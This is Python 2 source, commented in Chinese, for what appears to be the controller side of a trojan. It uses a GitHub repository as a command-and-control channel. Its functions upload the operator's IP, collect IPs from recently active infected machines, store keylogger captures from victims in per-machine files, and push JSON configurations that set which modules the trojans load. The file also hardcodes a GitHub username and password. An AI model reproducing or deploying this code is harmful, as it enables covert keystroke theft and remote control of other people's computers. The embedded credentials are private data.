# -*- coding: utf-8 -*- #
import base64
import socket
import time
import datetime
import wmi 
import os 
import stat

from github3 import *


# 获得mac地址
def network(): 
    c = wmi.WMI ()
    for interface in c.Win32_NetworkAdapterConfiguration (IPEnabled=1): 
        print "MAC: %s" % interface.MACAddress 
        return str(interface.MACAddress).replace(":","-")

#黑客上传自己的ip到github
def writeIpOfHack(rep):
	if rep.contents("ip/hackip.txt") == None :
		print "hack ip initialize"
		rep.create_file("ip/hackip.txt","mumaip.txt automatically from py",LocalIp())
	else:
		con = rep.contents("ip/hackip.txt")
		con.update("update hack's ip automatically from py",LocalIp())


#获得本机ip地址
def LocalIp():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('10.255.255.255', 0))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP


#获取本机更新时间
def getLocalTime():
	nowstamp = int(time.time())
	#turn into other format like:"%Y-%m-%d %H:%M:%S"
	timeArray = time.localtime(nowstamp)
	dateTimeFormat = time.strftime("%m/%d", timeArray)
	dayTimeFormat = time.strftime("%H:%M:%S", timeArray)
	return dateTimeFormat,dayTimeFormat


#黑客获得可能能连接上的木马的Ip
def getRightIp(oricon):
	nowdate , nowtime = getLocalTime()
	if oricon == None : print "dont have such file\n" ;return;
	else :
		strtime = ""
		trydict = dict()	#initialize
		orimsg = base64.decodestring(str(oricon.content))
		print orimsg
		orilist = orimsg.split("\n")
		print orilist
		print "len of mumaip",len(orilist)
		for ilist in orilist :
			if ilist == "" or ilist == " ": continue;
			if ilist.split()[2]==nowdate :
				print "the same day"
				# can add condition by nowtime within 12 hours
				if int(nowtime.split(":")[0])-int(ilist.split()[3].split(":")[0])<13 :
					print "the same 12 hours"
					trydict[ilist.split()[0]]=ilist.split()[1]
					print ilist.split()[0]+" has been added"
				continue;
		return trydict


#得到木马端的键盘输入后存入文件并上传
def upKeyboard(rep,msg,pcname):
	if rep.contents("cache/"+pcname+"/keyboard.txt") == None :
	#	print "ip"
		rep.create_file("cache/"+pcname+"/keyboard.txt",pcname +" keyboard autosave file create",msg)
	con = rep.contents("cache/"+pcname+"/keyboard.txt")
	d,t = fileOperation.getLocalTime()
	upFile(con,msg,"upload keyboard "+d+" "+t)


#更新文件用
def upFile(oricon,msg,comment):
	if oricon == None : print "dont have such file\n" ;return;
	orimsg=base64.decodestring(str(oricon.content))
	oricon.update(comment,orimsg+msg)



#删除字符串的最后一个字符
def DelLastChar(str):
    str_list=list(str)
    str_list.pop()
    return "".join(str_list)

#黑客上传JSON配置信息
def updateJSON(rep,modi):
	print "update"
	for (m,moli) in modi.items():
		#print "key:"+m+",value:"+moli
		wr = "["
		for mo in moli:
			wr +="{\"module\":\""+mo+"\"}"
			wr +=","
		wr = DelLastChar(wr)
		wr += "]"
		print wr
		if rep.contents("config/"+m+".json") == None :
	#	init "mac"
			print "init"
			rep.create_file("config/"+str(m)+".json","update load module by hacker",wr)
		con = rep.contents("config/"+str(m)+".json")
		con.update("update load module by hacker",wr)


# 登录到github
def connect_to_github():
    gh = login(username="OXVyeah", password="heiya233")
    #print(gh)
    repo = gh.repository("OXVyeah", "TROyeah")
    #print(repo)
    branch = repo.branch("master")
    print(u"连接啦")
    return gh, repo, branch